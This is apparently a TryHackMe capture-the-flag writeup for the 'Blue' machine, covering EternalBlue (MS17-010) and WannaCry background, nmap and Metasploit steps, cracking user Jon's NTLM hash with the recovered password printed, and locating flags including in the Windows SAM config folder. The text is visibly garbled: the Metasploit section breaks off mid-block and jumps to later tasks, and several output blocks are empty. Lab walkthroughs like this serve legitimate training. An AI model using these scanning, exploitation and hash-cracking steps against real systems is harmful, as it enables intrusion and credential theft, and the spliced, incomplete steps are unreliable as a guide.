# **Blue**

### Summary
* This is a writeup of the vulnerable machine 'Blue' on the website TryHackMe. This machine is vulnerable with the EternalBlue exploit. The EternalBlue exploit is a malicious attack that allows a threat agent to remotely execute arbitrary code to gain access to a network by sending speially crafted packets.

#### EternalBlue 
* This exploits a software vulnerability in the Windows OS SMBv1 protocol.
* The SMB protocol is a network file sharing protocol that allows access to files on a remote server.
* EternalBlue has the ability to compromise networks, which means that if one devices is infected then every device connected to the network is at risk.
* To Learn more information about EternalBlue: https://www.cisecurity.org/wp-content/uploads/2019/01/Security-Primer-EternalBlue.pdf
* MS17-010: https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010

#### WannaCry Ransomware
* Ransomware is an attack where access to the system and data is blocked until a ransom is paid, normally being paid in cryptocurrency.

The WannaCry ransomware attack was a global cyber attack that took place in May 2017. This attack hit around 230,000 computers globally. One of the first companies that was hit was a Spanish mobile company called Telefonica. Not long after, thousands of NHS hospitals and surgeries across the UK were affected.

According to security researcher Marcus Hutchins, the ransomware attack acting almost like a worm. It was replicating itself and spreading to nodes across the network.

What was very terrfying about this attack is that **ambulances were reportedly rerouted, leaving peope in need of urgent care**. It cost the NHS Â£92 million after 19,000 appointments were canceled as a result from the attack.

This attack spread and crippled computer systems in 150 countries. **Overall the WannaCry ransomware attack had a huge impact worldwide; it is estimated that this cybercrime caused $4 Billion in losses across the globe**.

Now that we have some background information and we have some knowledge of how this attack can have a real world impact. **Let's get to hacking!**


#### Task 1: Recon

**Q1: Scan the machine**
* `sudo nmap -Pn -vv -T4 -oN blue_scan 10.10.34.14`

*To see the result of the scan, look at the file blue_scan in the nmap folder.*

From our first scan we were able to find that the port 445 is open and is running SMB on windows 7 professional with service pack 1.

```
445/tcp   open  microsoft-ds       syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```

```

````

From this information we could do some research to check if there is a vulnerability for this OS on this port. Since we already know the exploit on this machine we do not need to do this. This nmap script when ran will scan the target for the EternalBlue. This is not needed, but nice to know you can run scripts like this.

* `sudo nmap -Pn --script=smb-vuln-ms17-010 -oN nmap/blue_script 10.10.34.14`

*To see the results of this scan, look at the file blue_script in the nmap folder.*

**Q2: How many ports are open with a port number under 1000?**
* Within our nmap scan we performed earlier we were able to see the ports open on the network. **There were 3 ports open under 1000.**

```
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```

**Q3: What is the machine vulnerable to? (Answer in the form of: ms??-???, ex: ms-08-067)**
* Read in the earlier section, "EternalBlue", to find the answer.

---

#### Task 2: Gain Access

**Q1: Start Metasploit**
* `msfconsole`

**Q2: Find the exploitation code we will run against the machine. What is the full path of the code?**

Since we already know what the vulnerablity is, EternalBlue, we can use the search function within metasploit to find the code.

* `search eternalblue`
```
msf6 > search eternalblue

The user is **Jon**.

**Q2: What is the cracked password?**

Copy `ffb43f0de35be4d9917ac0cc8ad57f8d` from beside Jon:1000:

you can use crackstation a website to crack this hash.

the password is `alqfna22`

#### Task 5: Find Flags!

**Flag 1**

In order to find this shell we will need to run the `shell` command tool in the meterpreter shell we popped earlier. This will give us a normal windows shell, so that we can run windows commands and explore the file system.

now that we have a windows shell. 

type the command: `cd \`

now type the command: `dir`

```
C:\Windows\system32>cd \
cd \

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

we found the first flag now lets find out what it is?

type the command: `type flag1.txt`

```

*the flag is flag{access_the_machine}*

**Flag 2**

this flag is stored at the location where passwords are stored within windows.

this will be found in the `config` folder in Windows 

type the command: `cd C:\Windows\System32\config`

now type `dir`

```

*the flag is flag{sam_database_elevated_access}*

**Flag 3**

this next flag will be need to be in an elevated environment so lets move back to our meterpreter shell.

now type the command `cd C:/` 

now lets search to find the last flag.

type the command: `search -f flag*.txt`

the third flag is located at `c:\Users\Jon\Documents\flag3.txt`

type the command: `cd Users\Jon\Documents\flag3.txt`

*the flag is flag {admin_documents_can_be_valuable}*
